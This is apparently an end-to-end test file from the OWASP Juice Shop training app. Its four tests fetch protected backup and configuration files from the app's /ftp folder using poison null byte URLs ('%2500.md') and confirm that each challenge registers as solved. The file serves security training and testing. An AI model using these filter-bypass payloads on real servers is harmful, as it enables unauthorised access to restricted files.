/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */


  describe('challenge "forgottenBackup"', () => {
    it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', () => {
      browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak%2500.md')
    })

    protractor.expect.challengeSolved({ challenge: 'Forgotten Sales Backup' })
  })

  describe('challenge "forgottenDevBackup"', () => {
    it('should be able to access file /ftp/package.json.bak with poison null byte attack', () => {
      browser.driver.get(browser.baseUrl + '/ftp/package.json.bak%2500.md')
    })

    protractor.expect.challengeSolved({ challenge: 'Forgotten Developer Backup' })
  })

  describe('challenge "easterEgg1"', () => {
    it('should be able to access file /ftp/easter.egg with poison null byte attack', () => {
      browser.driver.get(browser.baseUrl + '/ftp/eastere.gg%2500.md')
    })

    protractor.expect.challengeSolved({ challenge: 'Easter Egg' })
  })

  describe('challenge "misplacedSiemFileChallenge"', () => {
    it('should be able to access file /ftp/suspicious_errors.yml with poison null byte attack', () => {
      browser.driver.get(browser.baseUrl + '/ftp/suspicious_errors.yml%2500.md')
    })

    protractor.expect.challengeSolved({ challenge: 'Misplaced Signature File' })
  })

